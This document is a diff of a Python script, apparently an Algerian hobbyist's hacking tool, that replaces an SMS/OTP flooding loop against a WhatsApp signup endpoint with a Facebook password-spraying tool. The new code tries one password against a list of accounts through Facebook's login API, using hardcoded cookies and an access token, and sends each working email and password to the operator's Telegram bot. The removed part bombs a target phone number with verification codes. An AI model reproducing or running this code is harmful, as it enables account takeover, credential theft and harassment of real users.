@@ -1,81 +1,108 @@
 
-import requests,json,os
+
+
+import os,sys,string,pyfiglet
+import requests,random
 from user_agent import generate_user_agent
 from time import sleep
 
+os.system("clear") 
 
-R = '\x1b[38;5;1m'   # أحمر
+R = '\x1b[38;5;1m'   # احمر
 M = '\x1b[38;5;244m' # رمادي 
-L = '\x1b[38;5;10m' #اخضر 
+L = '\x1b[38;5;112m' #اخضر 
+G = '\x1b[38;5;191m' # اصفر
 
-
-
-contt = 0
 OK = 0
-BAD = 0
+CP = 0
+Total = 0
 
-contry = input(' Enter contre (DZ) :').strip()
-
-os.system("clear")
-
-phone = input(" Enter number phone :").strip()
-
-os.system("clear")
-
-cod = input(' Enter cood contre (+) :').strip()
-
-
-sleep(3)
-
-
-ful = f"+{cod}{phone}"
-
+tok =input(
+	f"{L} [{M} Enter Token {L}] \n"
+	f"\n"
+	f"{R}   ==> {L}"
+)
 
 os.system("clear")
 
-sleep(1)
+id =input(
+	f"{L} [{M} Enter id {L}] \n"
+	f"\n"
+	f"{R}   ==> {L}"
+
+)
+
+os.system("clear")
+
+if not tok or not id:
+	print(R+" لازم تدخل توكنك وايدييك ")
+	sys.exit()
 
 
-while True:
-	contt += 1
+def send_telegram(message):
+    try:
+        url = f"https://api.telegram.org/bot{tok}/sendMessage"
+        data = {"chat_id": id, "text": message}
+        requests.post(url, data=data, timeout=5)
+    except:
+        pass
 
-	url = "https://gw.abgateway.com/student/whatsapp/signup"
-	        
+
+ib =input(
+	f"{L} [{M} Enter file (id) {L}]\n"
+	f"\n"
+	f"{R}   ==> {M}"
+)
+
+os.system("clear")
+
+
+pas = str(input(f"{L} [{M} Choice Pasword {L}] :"))
+
+os.system("clear")
+
+def logo(txt):
+	print(f"{R}={M}="*30)
+	print(pyfiglet.figlet_format(txt))
+	print(f"{R}={M}="*30)
+	print(f"{G}	Developer : {L} ibrahim 🇩🇿")
+	print(f"{R}={M}="*30)
+	print()
+
+logo("  IBRAHIM ")	
+
+
+for ibrr in open(ib,"r").read().splitlines():
+	em = str(ibrr)
+	cookies = {
+    'datr': 'UQ-Baol52a5iz2RvO3vKbOMn',
+    'sb': 'UQ-BatRDIIUWbsYhLEvoC2KA',
+    'ps_l': '1',
+    'ps_n': '1',
+    'dpr': '2.260737895965576',
+    'fr': '0A2NRtmGZw7LS3UJp.AWc4IMQsbVWrIkBKeFSIrTEqBhWCPxN4qYoyheYf40zEvSrwt4c.BqgQ9R..AAA.0.0.BqmQ7D.AWcrhCHEqnR7D9CsEqyfB77wafU',
+    'wd': '891x1737',
+}
+	url = 'https://api.facebook.com/method/auth.login'
+	headers={'user-agent': generate_user_agent()}
 	
+	data = {'email':em,  'password':pas, 'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'format':'JSON'}
 	
-	
-	headers = {
-	            'User-Agent': str(generate_user_agent()),
-	            'Accept': "application/json",
-	            'Content-Type': "application/json",
-	            'x-trace-id': "guest_user:ec71bc1f-7bf7-490a-b0dc-dad31e7f31d7",
-	            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-	            'sec-ch-ua-mobile': "?1",
-	            'access-control-allow-origin': "*",
-	            'platform': "web",
-	            'sec-ch-ua-platform': '"Android"',
-	            'origin': "https://abwaab.com",
-	            'sec-fetch-site': "cross-site",
-	            'sec-fetch-mode': "cors",
-	            'sec-fetch-dest': "empty",
-	            'referer': "https://abwaab.com/",
-	            'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
-	            'priority': "u=1, i"
-	        }
-	payload = {
-	            "language": "ar",
-	            "password": "Abc123456",
-	            "phone": ful,
-	            "country": contry,
-	            "country_code": cod,
-	            "platform": "web"
-	        }
-	        
-	response = requests.post(url, data=json.dumps(payload), headers=headers,timeout=5).text
-	
-	if 'sms_otp_code_sent_succ' in response:
-	    OK += 1
+	response = requests.post(url, headers=headers, data=data,cookies=cookies,timeout=5).text
+
+
+	if 'session_key' in response:
+		OK += 1
+		Total += 1
+		f1 = f" email = {em} "
+		f2 = f" password = {pas}"
+		g = f"{f1}\n{f2}"
+		send_telegram(g)
+		print(
+		f"\r{G}  Cheked : [{Total}] {M}==> {R} CP [{CP}] {M}==> {L} OK : [{OK}] ",end="")
 	else:
-	    BAD += 1
-	    
-	print(f"\r {L} success : {OK} | {R} Faild : {BAD} : {ful} ",end="")
+		Total += 1
+		CP += 1
+		print(
+		f"\r{G}  Cheked : [{Total}] {M}==> {R} CP [{CP}] {M}==> {L} OK : [{OK}] ",end="")
+	 
